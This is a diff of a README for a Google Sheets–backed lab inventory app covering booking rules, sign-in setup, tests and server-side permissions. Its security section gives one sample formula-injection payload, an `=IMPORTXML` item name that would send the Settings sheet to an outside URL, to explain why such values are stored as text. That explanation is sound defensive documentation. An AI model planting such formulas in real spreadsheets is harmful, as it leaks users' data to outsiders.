@@ -34,13 +34,13 @@ The backend uses a Google Sheet with these tabs:
 
 **Deliveries** — `id | item | qty | unit | from | receivedBy | date | tracking | status`
 
-**Checkouts** — `id | itemId | item | user | out | ret | status | checkedOutByEmail | groupEmails | qty | fromTime | toTime`
+**Checkouts** — `id | itemId | item | user | out | ret | status | checkedOutByEmail | groupEmails | qty | fromTime | toTime | notes`
 
 **Orders** — `id | store | item | link | qty | unit | price | cat | requestedBy | reason | urgency | date | status | requestedByEmail`
 
 > ⚠️ Column order matters for new rows written by the script. If upgrading an existing sheet:
 > - **Orders**: add `requestedByEmail` as the last column (column 14)
-> - **Checkouts**: add `checkedOutByEmail`, `groupEmails`, `qty`, `fromTime` and `toTime` as the last five columns
+> - **Checkouts**: add `checkedOutByEmail`, `groupEmails`, `qty`, `fromTime`, `toTime` and `notes` as the last six columns
 > - `setupNewLab()` appends whatever is missing for you, in place, without touching existing rows
 > - Existing rows without these columns remain fully functional (permissions fall back gracefully)
 
@@ -49,8 +49,8 @@ The backend uses a Google Sheet with these tabs:
 | key | value |
 |-----|-------|
 | `categories` | `["Robots & Motors","Sensors & Vision","Compute & Electronics","Wiring & Networking","Tools & Hardware","Consumables & Supplies","Safety & Facility","Other"]` |
-| `admins` | `["jdoe12@jh.edu"]` — use the **sign-in name** (`<JHED>@jh.edu`), not the `@jhu.edu` mail alias. Compared case-insensitively. |
-| `members` | `["jdoe12@jh.edu","asmith3@jh.edu"]` — if present and non-empty, only these accounts can sign in; all other JHU accounts are rejected. Omit the key (or leave it as `[]`) to allow anyone in the JHU tenant. |
+| `admins` | `["jdoe12@jh.edu"]` — use the **sign-in name** (`<JHED>@jh.edu`), not the `@jhu.edu` mail alias. Compared case-insensitively. Must be valid JSON: `isAdmin` treats a value it cannot parse as "nobody is an admin", and only the Settings tab itself can then put you back. Saving it through the app is checked for exactly that, and refuses a list that leaves you out. |
+| `members` | `["jdoe12@jh.edu","asmith3@jh.edu"]` — if present and non-empty, only these accounts can sign in; all other JHU accounts are rejected. Omit the key (or leave it as `[]`) to allow anyone in the JHU tenant. **Anyone in `admins` is a member whether or not they are listed here** — otherwise filling this in and forgetting yourself would lock you out of your own lab, settings included. |
 | `slack_mode` | `all` or `important` or `digest` or `off` |
 
 **DeleteLog** (auto-created) — `date | type | name | details | deletedBy`
@@ -67,9 +67,17 @@ The backend uses a Google Sheet with these tabs:
 | `Checkout` | everyone | item → person, return date |
 | `Return` | everyone | item, original checkout owner |
 | `AddOrder` | everyone | item, store, qty, urgency |
-| `UpdateOrder` | everyone | item, store |
+| `UpdateOrder` | requester (while Pending) or admin | item, store |
 | `OrderStatus` | admins only | item → new status |
 | `DeleteOrder` | admins only | order name |
+| `CheckoutPending` | everyone | item → person, until, why it waits, how many competing |
+| `CheckoutApproved` | admins only | item → person |
+| `CheckoutRejected` | admins only | item → person |
+| `CheckoutEdited` | requester or admin | item → person, the new dates |
+| `CheckoutWithdrawn` | requester or admin | item, what was withdrawn |
+| `NotifyLowStock` | everyone | item, note |
+| `PurchaseSummary` | admins only | how many orders |
+| `SaveSetting` | admins only | key = value (first 200 chars) |
 
 **SlackQueue** (auto-created, used by digest mode) — `time | emoji | title | details | fields`
 
@@ -99,12 +107,29 @@ This is **separate from the Figueroa lab's registration** (`5ac3d97f-…`), on p
 Sharing one would mean either lab's token passed the other backend's `aud` check,
 and Alliance users would see "Figueroa Lab Inventory" on the Microsoft sign-in screen.
 
-Adding a redirect URI later (a new domain, say) is additive:
+Adding a redirect URI later (a new domain, say) means **rewriting the whole list**.
+PATCH replaces `spa.redirectUris` outright — it does not merge — so every URI you
+still want has to appear, including the two localhost ones the local-dev section
+below tells you to open:
 
 ```bash
 az rest --method PATCH \
   --url https://graph.microsoft.com/v1.0/applications/131c5c77-3d58-40b5-979f-3773a54776ca \
-  --body '{"spa":{"redirectUris":["https://labtrack.zizhe.io/","http://localhost:8000/","<new URL>"]}}'
+  --body '{"spa":{"redirectUris":[
+    "https://labtrack.zizhe.io/",
+    "http://localhost:8000/",
+    "http://localhost:8000/index.html",
+    "<new URL>"]}}'
+```
+
+Leaving one out does not fail; sign-in from that address just starts returning
+`AADSTS50011: redirect URI … does not match`. Read the current list back first if
+you are unsure:
+
+```bash
+az rest --method GET \
+  --url https://graph.microsoft.com/v1.0/applications/131c5c77-3d58-40b5-979f-3773a54776ca \
+  --query spa.redirectUris
 ```
 
 The SPA platform type matters: it enables CORS on the token endpoint and issues
@@ -180,6 +205,7 @@ login could only ever show one side of it:
 | Overdue banner | "You have 1 overdue item" | none — it isn't theirs | "1 item overdue in the lab" |
 | Low-stock banner & chip | hidden | hidden | shown |
 | Pending requests on the calendar | only their own | only their own | everyone's |
+| Pending requests in the Usage list | everyone's, by name | everyone's, by name | everyone's |
 | Edit / Withdraw on a request | only their own | only their own | anyone's |
 
 Nothing reaches the backend: every API call is short-circuited client-side, and
@@ -198,7 +224,14 @@ goes stale.
 It seeds only when the local store is empty **and** the token is `"local"`, so it
 can never appear in front of a real backend. Editing it is normal — changes persist
 to `localStorage` like any preview change. To get the sample lab back, clear
-`labtrack_data` (or the whole origin) and sign in again.
+`labtrack_data_preview` (or the whole origin) and sign in again.
+
+Preview writes to **`labtrack_data_preview`**; a real session's offline cache is
+**`labtrack_data`**. They used to share one key, and both the no-backend branch and
+the backend-error fallback read that cache — so someone who clicked "Member One" to
+look around and then signed in for real was shown the sample lab as if it were the
+lab's, and any write went out against those rows. Separate keys make that
+impossible in both directions.
 
 **Dev key** — set the same random string in both files:
 
@@ -253,14 +286,19 @@ Set `slack_mode` in the Settings tab:
 | `digest` | Queues events; sends compact daily summary at 5pm ET |
 | `off` | No notifications |
 
-### Setting Up Triggers (for digest mode)
+### Setting Up Triggers
 
-Go to **Apps Script → Triggers → Add Trigger**:
+Easiest: run **`createTriggers()`** once from the Apps Script editor. It removes any
+existing triggers for these three functions first, so it is safe to re-run, and
+creates all three at the right times.
 
-| Function | Event Type | Time |
-|----------|-----------|------|
-| `sendDailyDigest` | Time-driven → Day timer | **5pm – 6pm** |
-| `checkOverduesAndAlert` | Time-driven → Day timer | 8am – 9am |
+By hand instead — **Apps Script → Triggers → Add Trigger**:
+
+| Function | Event Type | Time | Needed for |
+|----------|-----------|------|------------|
+| `sendDailyDigest` | Time-driven → Day timer | **5pm – 6pm** | digest mode |
+| `checkOverduesAndAlert` | Time-driven → Day timer | 8am – 9am | overdue nags, any mode |
+| `backupSpreadsheet` | Time-driven → Week timer, Sunday | 3am – 4am | the weekly Drive copy |
 
 > Make sure the script timezone is **America/New_York** so 5pm ET is correct.
 
@@ -289,15 +327,30 @@ Use the `@jh.edu` UPN, not the `@jhu.edu` mail alias:
 ["jdoe12@jh.edu","asmith3@jh.edu"]
 ```
 
-**Admins can**: delete items/orders, manage categories, change settings, send digest manually, change order status (Approve/Reject/etc.), edit any order request, return any checked-out item
+**Admins can**: delete items/orders, manage categories, change settings, send digest manually, change order status (Approve/Reject/etc.), approve or reject a booking that is waiting, edit any order request, return any checked-out item, write the Purchase Summary sheet, run a backup
 
-**All users can**: add/edit items, check out items, log deliveries, submit order requests
+**All users can**: add/edit items, check out items, log deliveries, submit order requests, report a supply as running low
 
 **Requester** (or admin): edit their own order request — but only while it is still `Pending`. Once an admin approves it, editing the quantity or price would quietly change what was approved, so it becomes admin-only. Enforced in Apps Script, not just hidden in the UI
 
-**Checkout owner + group members** (or admin): return a checked-out item. Group members are listed at checkout time as comma-separated emails.
+**Requester** (or admin): edit or withdraw their own booking request — but only while it is still `Pending Approval`. `updateCheckout` accepts `out`, `ret`, `fromTime`, `toTime` and `groupEmails` and nothing else; taking the body wholesale would let a member patch `status: "Active"` and approve themselves
+
+**Checkout owner + group members** (or admin): return a checked-out item, and only while it is still `Active`. Group members are listed at checkout time as comma-separated emails, matched case-insensitively on both sides.
 
 All deletions are logged in the DeleteLog tab with timestamp, details, and who deleted.
+
+### What the server decides, whatever the browser sends
+
+The form is not the boundary. Anything a browser can POST, `curl` can POST, so a
+few fields are overwritten server-side rather than trusted:
+
+| Field | Rule |
+|-------|------|
+| `Orders.status` | A member's create is forced to `Pending`, and `status` is dropped from a member's edit. `updateOrderStatus` is admin-only and says why; `updateOrder` used to carry `status` in its whitelist, so a member could walk round the back and approve their own $2400 request — silently, with no Slack notice and an audit line reading only `UpdateOrder \| store:—`. The form hides the dropdown from members and labels it *Status (Admin only)*; that hid it from the click, not from the request |
+| `Orders.requestedBy` / `requestedByEmail` | Stamped with the caller on create, so a request cannot be filed under someone else's name |
+| `Checkouts.user` / `checkedOutByEmail` | Stamped with the caller on create unless the caller is an admin, who legitimately logs checkouts on other people's behalf. These fields decide who is nagged for an overdue return and who may edit or withdraw the row, so they have to be the person who actually asked |
+| `Checkouts.status` | Set by `waitReason_()`, never by the browser. A member cannot post themselves an already-approved booking |
+| `Settings.admins` | Refused if it is not a JSON array, or if it leaves the caller out — there would be nobody left in the app to put them back |
 
 ---
 
@@ -312,7 +365,7 @@ All deletions are logged in the DeleteLog tab with timestamp, details, and who d
 - **Booking rules**: shared items are booked by the hour and long holds need an admin — see below
 - **Calendar**: Month and week views. A booking draws as a **span across every day it covers**, not two marks at its ends, coloured by what it is — blue in use, amber awaiting approval, red overdue, grey returned. A daily window (`13:00–16:00`) renders as a block at those hours on **every** day of the hold; an all-day multi-day hold goes in the week view's all-day strip instead, the way a calendar normally splits them. Active holds are visible to everyone; **pending requests only to the person who asked and to admins**, since an undecided request is nobody else's business yet
 - **Live Sync**: Auto-polls every 30s so all users see changes without refreshing
-- **Pagination & Sort**: 24 items/page with sort by name, date, quantity; Order Requests tab has search/filter/pagination (15/page) with shift-click range select
+- **Sort & paging**: the inventory loads 24 at a time and grows with a *Show more* button — it does not paginate; sort by name, date or quantity. The Order Requests tab does paginate, 15 per page, with search, filter and shift-click range select
 - **Slack**: Rich Block Kit notifications; daily 5pm ET digest with compact PI-friendly summary; `important` mode for urgent orders + overdues only
 - **Dark/Light Mode**: Toggle with the ☀/🌙 button in the header; preference saved per browser
 - **Access Control**: Server-side RBAC — admins control categories/deletion/settings; order editing restricted to requester; returns restricted to checkout owner + group members; all enforced in Apps Script, not just UI
@@ -322,12 +375,13 @@ All deletions are logged in the DeleteLog tab with timestamp, details, and who d
 
 ## Booking rules
 
-Five rules govern checkouts. All five are enforced in `google-apps-script.js`,
+Six rules govern checkouts. All six are enforced in `google-apps-script.js`,
 which is the only place that can see everyone's bookings at once; the checkout form
 re-implements them so it can refuse before a round trip instead of after one. The
 two halves have to be kept in step — the constants carry the same names on both
 sides (`MAX_DAYS_WITHOUT_APPROVAL`, `MAX_LEAD_DAYS`, `bookingsClash_`/`bookingsClash`,
-`waitReason_`/`waitReason`, `leadTooFar_`/`leadTooFar`).
+`waitReason_`/`waitReason`, `leadTooFar_`/`leadTooFar`, `badRange_`/`badRange`,
+`bookingMs_`/`bookingMs`).
 
 **1. Shared items are booked by the hour.** Checking out an item marked *Shared*
 asks whether the hold is all day or the same window every day (`fromTime`,
@@ -336,10 +390,20 @@ selected — a sole-use item is held for the whole span whatever the clock says,
 asking would imply a freedom that isn't there. A batch containing both writes the
 window only onto the shared rows.
 
-**2. An active booking owns its slot.** Two bookings of the same shared item clash
-when their date ranges overlap **and** their daily windows do. A blank window is
-all day and clashes with anything inside the range. Touching endpoints don't clash,
-so handing something over at 12:00 is fine. Only `Active` blocks — see rule 4.
+**2. An active booking owns its slot.** Two bookings of the same item clash when
+their date ranges overlap **and** their daily windows do. A blank window is all
+day and clashes with anything inside the range. Touching endpoints don't clash, so
+handing something over at 12:00 is fine. Only `Active` blocks — see rule 4.
+
+> This applies to **sole-use items too**, which it did not always. The old rule
+> skipped them on the grounds that a sole-use item is kept exclusive by its
+> availability rather than by the hour — but the In Use flag is written from the
+> browser's copy of the item list, which is up to a poll old, so two people who
+> pressed Check Out inside the same thirty seconds both got the arm; and the flag
+> knows nothing about dates, so it could not tell a booking for next week from one
+> for right now. A date range is the honest test for both kinds of item. A sole-use
+> item simply has no daily window, which reads as all day and clashes with anything
+> inside the range — which is what exclusive means.
 
 **3. A booking waits for an admin for either of two reasons.** `waitReason_()`
 is the single place that decides, and returns `"long"`, `"queue"` or `""`:
@@ -390,6 +454,24 @@ the lead time bounds that at a month.
 
 Start dates in the **past** stay legal — logging a checkout after the fact is
 normal, and nothing about it can block a future booking that isn't already there.
+
+**6. The dates have to make sense.** `badRange_()` refuses a booking whose return
+date is missing, unparseable, or on or before the checkout date, and a daily window
+that is half-filled or ends before it starts. This is not fussiness: every rule
+above is a comparison between two instants, and a comparison against something
+unparseable is false, so a backwards range did not trip the rules — it slipped past
+all five at once. It measured as a negative number of days, so it was never long
+enough to need approval; it clashed with nothing, so it never blocked; it covered
+no calendar day, so it drew nowhere at all — while sitting in the Usage list as an
+active, already-overdue loan. Typing the wrong month into the second date box was
+all it took. The form refuses it before the round trip and names the reason.
+
+Both ends of a booking are read off the **local** clock. `new Date("2026-08-25")`
+is UTC midnight while `new Date("2026-08-25T09:00")` is local, and the form lets
+you leave the return *time* blank — so a hold from 18 Aug 09:00 to 25 Aug used to
+measure as 6.46 days rather than 7, and one from 18 Aug 20:00 to 26 Aug measured as
+exactly 7.0 and so slipped under "more than 7". `bookingMs_()` builds the instant
+from the parts rather than leaving it to the parser.
 
 The date picker carries `max={leadLimitDate()}`, so the native calendar greys out
 anything later; the red notice is for typed or pasted dates, and the backend
@@ -525,10 +607,28 @@ changed**; these are only the record of *why*.
 
 ```bash
 node --check google-apps-script.js       # backend syntax
-node test-sheet-setup.js                 # 119 assertions: setup, labels, per-unit
-                                         # targeting, order edit window, booking rules
+node test-sheet-setup.js                 # 158 assertions: setup, labels, per-unit
+                                         # targeting, order approval, booking rules
+node test-sheets-coercion.js             # 25 assertions: the ones that only fail live
 node test-storage-layer.js > after.json  # behaviour snapshot — see below
 ```
+
+**`test-sheets-coercion.js` is the one worth understanding.** The in-memory sheet
+the other two tests use stores whatever JavaScript value it is handed and gives the
+same one back. A real Google Sheet does not: it *parses* what you write. `"09:00"`
+becomes a time and reads back as a `Date` in 1899. `"2026-08-18 09:00"` becomes a
+datetime and reads back as a `Date`. A serial number that happens to be all digits
+comes back a `Number`. `"TRUE"` comes back a boolean. Text beginning with `=` stops
+being text at all.
+
+Two bugs lived in exactly that gap, and neither was visible to the other two files:
+every daily time window silently became all-day after one round trip, and every
+rule evaluated on a `findRow()` row — the "taken while this was waiting" re-check,
+the whole edit path — quietly found no conflict. So this file wraps the same stub
+in a layer that coerces the way Sheets coerces, and asserts the rules still hold.
+
+If you add a column that stores anything other than plain text, add it to
+`normalizeRow_()` and add a case here.
 
 The app is one big inline Babel block, so a JSX syntax error renders a blank page
 with no stack trace. Compiling it with `@babel/standalone` 7.24.7 before deploying
@@ -545,20 +645,42 @@ readTable   findRow   appendRow   updateRow   deleteRow   clearTable
 readSettings   writeSetting   getSheet   getOrCreateSheet
 ```
 
+plus two that convert between what the store holds and what the rules expect:
+
+```
+normalizeRow_    on the way out — undo the store's own type coercion
+serializeCell_   on the way in  — arrays to JSON, and text that a spreadsheet
+                                  would rather run marked as text
+```
+
+`normalizeRow_` is the reason `readTable` and `findRow` return the same shape. They
+did not always: `findRow` handed back raw sheet values, which meant a `Date` where
+every booking rule expected `"YYYY-MM-DD HH:MM"`, and a comparison against a `Date`
+that stringifies to `"Sat Aug 18 2026 09:00:00 GMT-0400"` yields `null` — so the
+rules did not fail loudly, they found no conflict. **Any new reader must go through
+one of these two; anything that reads `getValues()` directly is a bug waiting.**
+
 Everything else in the backend — token verification, RBAC, Slack, the digest,
 audit logging — is storage-agnostic, and the frontend only ever calls
 `API.fetchAll(token)` and `API.post(token, action, payload)`. **Changing where the
-data lives means reimplementing that section and nothing else.**
+data lives means reimplementing that section and nothing else** — with one
+exception below.
 
-Two functions deliberately sit outside the layer and are marked `SHEETS-ONLY`,
-because they emit formatted spreadsheets as output rather than storing data:
-`backupSpreadsheet()` and the `generatePurchaseSummary` action. Both are dropped
-rather than ported.
+Three functions deliberately sit outside the layer and are marked `SHEETS-ONLY`,
+because they emit formatted spreadsheets as output rather than storing data, or
+build the store itself: `backupSpreadsheet()`, the `generatePurchaseSummary`
+action, and `setupNewLab()`. The first two are dropped rather than ported.
+`setupNewLab()` has to be rewritten for whatever the new store is — it creates the
+tables and widens ones that predate a column, which is a job every store has and
+none of them share an API for.
 
 `test-storage-layer.js` stubs the Apps Script globals with an in-memory
-spreadsheet and runs every action, `doGet`, and the digest under both
-`slack_mode=all` and `slack_mode=digest`. It is a differential test — the output
-only means something compared against another run:
+spreadsheet and runs most actions, `doGet`, and the digest under both
+`slack_mode=all` and `slack_mode=digest`. Not every action: `decideCheckout`,
+`updateCheckout`, `cancelCheckout`, `notifyLowStock`, `generatePurchaseSummary`,
+`backupNow` and the `sendDigest` wrapper are never posted, so the whole
+booking-approval write path is covered by `test-sheet-setup.js` instead. It is a
+differential test — the output only means something compared against another run:
 
 ```bash
 node test-storage-layer.js > before.json
@@ -808,11 +930,23 @@ front.
 - Slack webhook stored only in Apps Script (server-side), never in client code
 - No secrets in HTML — only the Entra client ID and tenant ID (both designed to be public) and the Apps Script URL
 - **Server-side RBAC**: every sensitive action is verified in Apps Script regardless of client state:
-  - Category changes → admin only
-  - Order edits → requester (`requestedByEmail`) or admin only
-  - Item returns → checkout creator (`checkedOutByEmail`), group members, or admin only
+  - Category changes, settings, the Purchase Summary sheet, backups → admin only
+  - Order **status** → admin only, on both `updateOrderStatus` and `updateOrder`
+  - Order edits → requester (`requestedByEmail`) while still `Pending`, or admin
+  - Booking approve / reject → admin only; booking edit / withdraw → requester (`checkedOutByEmail`) or admin, and only while still `Pending Approval`
+  - Item returns → checkout creator, group members, or admin, and only while still `Active`
   - Deletions → admin only
+- **Identity fields are stamped, not accepted.** A member's checkout and order rows are filed under the caller's own name and address whatever the request body says, and a booking's `status` is decided by the rules rather than sent in. See *What the server decides, whatever the browser sends* above
+- **Text that a spreadsheet would run is stored as text.** A value beginning with `=`, `+`, `-` or `@` is written with a leading apostrophe, so an item named `=IMPORTXML("https://…"&Settings!A1:B99,"//a")` is a name rather than a live exfiltration of the admin roster the next time somebody opens the sheet
 - Legacy rows without `requestedByEmail`/`checkedOutByEmail` are not restricted (backward compatible)
+
+### What is deliberately *not* restricted
+
+Worth knowing, because none of it is an oversight:
+
+- **Any member can add and edit any item** — name, quantity, location, category, `status`, and the `shared` and `consumable` flags. The lab inventory is a shared document; the edit lock in the header is a guard against fat fingers, not a permission. The costly direction is `status`: a member can set an item to `Available` while somebody has it. Since rule 2 now clash-checks by date rather than trusting that flag, this no longer lets anyone double-book — it just makes a badge wrong
+- **`doGet` returns every table to every member**, including all pending requests and the `admins`/`members` roster. The calendar hides other people's pending requests, but that is presentation, not access control; anyone who opens the network tab sees them. Do not put anything in Settings you would not show the whole lab
+- **Any member can trigger a Slack notification** by reporting a supply as running low. That is the point of the button
 
 ## Troubleshooting
 
